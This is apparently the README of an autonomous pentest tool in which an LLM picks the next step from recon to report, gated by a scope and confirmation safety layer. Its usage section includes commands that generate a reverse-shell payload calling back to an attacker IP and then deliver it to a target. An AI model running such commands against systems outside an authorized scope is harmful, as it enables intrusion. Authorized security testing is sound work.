# breachload

Autonomous pentest copilot for Linux. Guides an engagement from recon to report:
runs tools, parses their output into structured state, decides the next step, and
generates working notes and findings — while a deterministic safety layer keeps
every action inside the authorized scope.

> For authorized security testing, CTF/HTB, and research only. You are responsible
> for having permission to test every target in scope.

## Design

- **Deterministic core, LLM for decisions.** Parsing, state, and scope are code.
  The model (Claude) only decides the next action and explains why. It never
  parses raw output and never bypasses the safety layer.
- **Structured state, not chat history.** Every host / service / credential /
  finding is a typed record (`core/state.py`), queryable and reproducible.
- **Safety layer is the spine of full-auto** (`safety/`): scope allowlist,
  command validation (binary allowlist + no shell metacharacters), and a risk
  classifier that forces confirmation on intrusive/exploit/destructive actions.
- **Runs offline.** With no `ANTHROPIC_API_KEY`, a heuristic planner still drives
  recon end-to-end so the pipeline is testable without the API.

## Layout

```
breachload/
  core/        orchestrator, state, config, llm planner, phases
  safety/      scope, validator, audit
  tools/       adapters (run + parse -> struct); nmap is the reference
  analysis/    cve mapping, cross-service correlation   (planned)
  analysis/    version->CVE mapping, correlator, rule-based suggestion engine
  exploit/     payload generation + delivery + offline payload library
  data/        vuln knowledge base + offline payload/technique library
  report/      findings -> markdown / pdf
  web/         FastAPI + WebSocket dashboard (on_event seam)
engagements/   per-engagement scope + state + audit log
```

## Usage

```bash
pip install -e .                    # add [web] for the dashboard: pip install -e '.[web]'
export ANTHROPIC_API_KEY=...        # optional; omit for offline heuristic mode

breachload auto engagements/example.yaml           # one shot: recon -> plan -> report
breachload run engagements/example.yaml            # auto-chain recon -> enum -> vuln
breachload status engagements/example.yaml         # current known state
breachload suggest engagements/example.yaml        # rule-based next steps (no API key)
breachload payloads --tag smb                      # browse the offline payload library
breachload gtfo find                               # offline GTFOBins privesc lookup
breachload doctor                                  # which tools/wordlists are installed
breachload flag engagements/example.yaml --scan loot/user.txt   # capture a flag
breachload report engagements/example.yaml --pdf   # Markdown (+ PDF) report
breachload serve engagements/example.yaml          # run with a live web dashboard

# Exploitation (offline generation is unrestricted; delivery is confirm-gated)
breachload payload engagements/example.yaml --payload linux/x64/shell_reverse_tcp \
    --lhost 10.10.14.9 --lport 4444 --fmt elf
breachload deliver engagements/example.yaml --artifact <name> --target 10.10.10.5
```

See [WALKTHROUGH.md](WALKTHROUGH.md) for a full box, start to finish. Grow the CVE
KB from an NVD feed with `breachload kb-import`, and add your own scanners via the
`breachload.tools` entry-point group (see the walkthrough).

## Autonomy & the safety layer

`auto_threshold` in the engagement YAML sets what runs without asking in
full-auto mode. Recon/enumeration flow automatically; anything the validator
classes above the threshold (brute-force, sqlmap dumping, exploit execution)
stops for confirmation. The safety layer governs **where** actions land and
**when** they need a human — it does not restrict analysis, payload crafting, or
exploit development.

## Roadmap

1. ~~Scaffold: state + safety + nmap adapter + advisor loop~~
2. Adapters: whatweb, ffuf, nuclei, enum4linux-ng
3. Analysis: version→CVE mapping, cross-service correlator
4. Full-auto with confirm-gates; kill-switch
5. Reporting engine
6. CTF mode (aggressive defaults, flag detection, light reporting)
```
